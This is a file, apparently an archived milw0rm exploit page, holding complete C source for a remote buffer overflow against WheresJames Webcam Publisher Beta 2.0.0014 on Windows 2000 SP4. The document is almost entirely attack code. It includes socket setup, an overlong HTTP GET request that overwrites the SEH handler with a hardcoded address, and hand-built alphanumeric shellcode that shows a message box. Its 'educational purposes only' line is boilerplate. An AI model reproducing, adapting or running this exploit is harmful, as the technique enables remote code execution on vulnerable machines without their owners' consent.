@@ -1,0 +1,178 @@
+<html>
+<head>
+<title>WheresJames Webcam Publisher Beta 2.0.0014 Remote Buffer Overflow</title>
+<pre>
+/*
+ * WheresJames Webcam Publisher Beta 2.0.0014 POC (www.wheresjames.com)
+ *
+ *
+ * Bug and Exploit by : Miguel Tarascó Acuña - Haxorcitos.com 2005
+ *                      Tarako AT gmail.com - Tarako AT Haxorcitos.com
+ *
+ * Platforms tested:
+ *
+ *       - Windows 2000 SP4 Spanish
+ *       - Probably All Windows 2000 versions
+ *
+ *
+ * Exploit Date: 15/April/2005
+ *
+ *
+ * THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY* IT IS PROVIDED &quot;AS IS&quot;
+ * AND WITHOUT ANY WARRANTY. COPYING, PRINTING, DISTRIBUTION, MODIFICATION
+ * WITHOUT PERMISSION OF THE AUTHOR IS STRICTLY PROHIBITED.
+ *
+ * Greetings to: #haxorcitos, #dsr and #localhost @efnet
+ *
+ *
+ * Little Explanation:
+ *
+ * Buffer must only have bytes between 0x20 and 0x7A, this limits you to use 
+ *  a generic shellcode.
+ * I created a harcoded MessageBoxA alphanumeric Shellcode to run with this POC
+ * Also the offset referenced by the Call ECX SEH handler overwriten, must contain
+ *  only bytes between 0x20 and 0x7A
+ *
+ * 77F69B9F   8B4D 18          MOV ECX,DWORD PTR SS:[EBP+18]
+ * 77F69BA2   FFD1             CALL ECX   
+ *
+ *  stack
+ * 00000000
+ * 00000000
+ * XXXXXXXX  &lt;-- EBX points to HERE (XX &gt;= 0x20 &amp;&amp; XX &lt;= 0x7A)
+ * YYYYYYYY  &lt;-- This DWORD overwrites the SEH handler (the flow is taken in the CALL ECX)
+ * 00000000
+ * 00000000
+ *
+ */
+
+#include &lt;winsock2.h&gt;
+#include &lt;stdio.h&gt;
+
+#pragma comment (lib,&quot;ws2_32&quot;)
+
+#define TIMEOUT 1
+#define TOPHEADER &quot;GET &quot;
+#define MIDDLEHEADER &quot;\nHost: &quot;
+#define BOTTOMHEADER &quot;\nUser-Agent: User-Agent: Haxorcitos/1.0 (compatible; MSIE 6.0; Windows NT 5.0)\n\
+Accept: */*\n\
+Accept-Language: es\n\
+Accept-Encoding: gzip,deflate\n\
+Keep-Alive: 100\n\
+Connection: keep-alive\r\n\r\n&quot;
+#define BUFFERLEN 5000
+
+
+char shellcode[] = // little harcoded alphanumeric &quot;shellcode&quot;
+// haaaaX5aaaaP[H-,F3T--F3U5!@z!ShkitohTaraTZSSRSSPÃ
+	&quot;\x68\x61\x61\x61\x61&quot; // PUSH 61616161     ;
+	&quot;\x58&quot;                 // POP  EAX          ; EAX = 61616161 
+	&quot;\x35\x61\x61\x61\x61&quot; // XOR  EAX,61616161 ; EAX = 00000000
+	&quot;\x50&quot;                 // PUSH EAX          ;
+	&quot;\x5B&quot;                 // POP  EBX          ; EBX = 00000000
+	&quot;\x48&quot;                 // DEC  EAX          ; EAX = FFFFFFFF
+	&quot;\x2D\x2C\x46\x33\x54&quot; // SUB  EAX,5433462C ; EAX = ABCCB9D3
+	&quot;\x2D\x2D\x46\x33\x55&quot; // SUB  EAX,5533462D ; EAX = 569973A6
+	&quot;\x35\x21\x40\x7A\x21&quot; // XOR  EAX,217A4021 ; EAX = 77E33387 USER32.MessageBoxA (Win2kSP4)
+	&quot;\x53&quot;                 // PUSH EBX          ;
+	&quot;\x68\x6B\x69\x74\x6F&quot; // PUSH 6F74696B     ; ASCII &quot;kito&quot;
+	&quot;\x68\x54\x61\x72\x61&quot; // PUSH 61726154     ; ASCII &quot;Tara&quot;
+	&quot;\x54&quot;                 // PUSH ESP          ;
+	&quot;\x5A&quot;                 // POP  EDX          ; ASCII &quot;Tarakito&quot;
+	&quot;\x53&quot;                 // PUSH EBX          ; 0
+	&quot;\x53&quot;                 // PUSH EBX          ; 0
+	&quot;\x52&quot;                 // PUSH EDX          ; Tarakito
+	&quot;\x53&quot;                 // PUSH EBX          ; 0
+	&quot;\x53&quot;                 // PUSH EBX          ; 0
+	&quot;\x50&quot;                 // PUSH EAX          ; MessageBoxA
+	&quot;\xC3&quot;;                // RETN
+
+
+struct  { char *name;  long offset; } supported[] = { 
+   // 0x72712F5E (clbcatq.dll 2000.2.3511.0) -&gt;  83C108 = ADD ECX,8  +  FFD1 = CALL ECX
+   {&quot;Windows 2000 Pro SP4 Spanish&quot;, 0x72712F5E }, 
+   {&quot;Crash&quot;, 0x41414141 }
+},VERSIONES;
+
+
+/******************************************************************************/
+void ShowHeader(int argc,char *argv[]) {
+   int i;
+   printf(&quot;\n WheresJames Webcam Publisher Beta 2.0.0014 Buffer Overflow POC\n&quot;);
+   printf(&quot; Exploit by Miguel Tarasco - Tarako [at] gmail [dot] com\n&quot;);
+	
+   printf(&quot;\n Windows Versions:\n&quot;);
+   printf(&quot; ---------------------------------------------\n&quot;);
+   for (i=0;i&lt;sizeof(supported)/sizeof(VERSIONES);i++) {
+      printf(&quot;  %d) %s (0x%08x)\n&quot;,i,supported[i].name,supported[i].offset);
+   }
+   printf(&quot; ---------------------------------------------\n\n&quot;);
+   if (argc&lt;4) {      
+      printf(&quot; Usage: %s &lt;IP&gt; &lt;Port&gt; &lt;Option&gt;\n&quot;,argv[0]);
+      exit(1);
+      exit(1);
+   }
+}
+/******************************************************************************/
+
+void main(int argc, char *argv[]) {
+   SOCKET s;
+   
+   WSADATA HWSAdata;
+   struct  sockaddr_in sa;
+
+   char *buffer=NULL;
+
+   ShowHeader(argc,argv);
+
+   if (WSAStartup(MAKEWORD(2,2), &amp;HWSAdata) != 0) { 
+      printf(&quot;\n [e] Error: WSAStartup():%d\n&quot;, WSAGetLastError()); 
+      exit(1); 
+   }
+
+   if ((s=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,0,0,0))==INVALID_SOCKET){ 
+      printf(&quot;\n [e] Error: socket():%d\n&quot;, WSAGetLastError()); 
+      exit(1); 
+   }
+
+   sa.sin_family           = AF_INET;
+   sa.sin_port             = (USHORT)htons(atoi(argv[2]));
+   sa.sin_addr.S_un.S_addr = inet_addr(argv[1]);
+
+   if ( connect(s, (struct sockaddr *) &amp;sa, sizeof(sa)) == SOCKET_ERROR ) { 
+      printf(&quot;\n [e] Error: connect()&quot;); 
+      exit(1); 
+   }
+
+   printf(&quot; [i] Connected : Yes\n&quot;);
+   printf(&quot; [i] Target    : %s\n&quot;,supported[atoi(argv[3])].name);
+
+   buffer=(char*)malloc(strlen(TOPHEADER)+BUFFERLEN+strlen(MIDDLEHEADER)+strlen(argv[1])+1+strlen(argv[2])+strlen(BOTTOMHEADER)+1); 
+   memset(buffer,0,sizeof(buffer));
+
+   memcpy(buffer,TOPHEADER,strlen(TOPHEADER));
+
+   memset(buffer+strlen(TOPHEADER),'A',BUFFERLEN);
+
+   memcpy(buffer+strlen(TOPHEADER)+1052,&amp;supported[atoi(argv[3])].offset,sizeof(long));
+
+   memcpy(buffer+strlen(TOPHEADER)+1060,shellcode,strlen(shellcode));
+
+   memcpy(buffer+BUFFERLEN,MIDDLEHEADER,strlen(MIDDLEHEADER));
+   memcpy(buffer+BUFFERLEN+strlen(MIDDLEHEADER),argv[1],strlen(argv[1]));
+   memcpy(buffer+BUFFERLEN+strlen(MIDDLEHEADER)+strlen(argv[1]),&quot;:&quot;,strlen(&quot;:&quot;));
+   memcpy(buffer+BUFFERLEN+strlen(MIDDLEHEADER)+strlen(argv[1])+strlen(&quot;:&quot;),argv[2],strlen(argv[2]));
+   memcpy(buffer+BUFFERLEN+strlen(MIDDLEHEADER)+strlen(argv[1])+strlen(&quot;:&quot;)+strlen(argv[2]),BOTTOMHEADER,strlen(BOTTOMHEADER));
+
+   send(s,buffer,strlen(buffer),0);
+
+   printf(&quot; [i] Buffer sent\n\n&quot;);
+
+   closesocket(s);
+
+}
+
+// milw0rm.com [2005-04-18]
+</pre>
+</html>
+
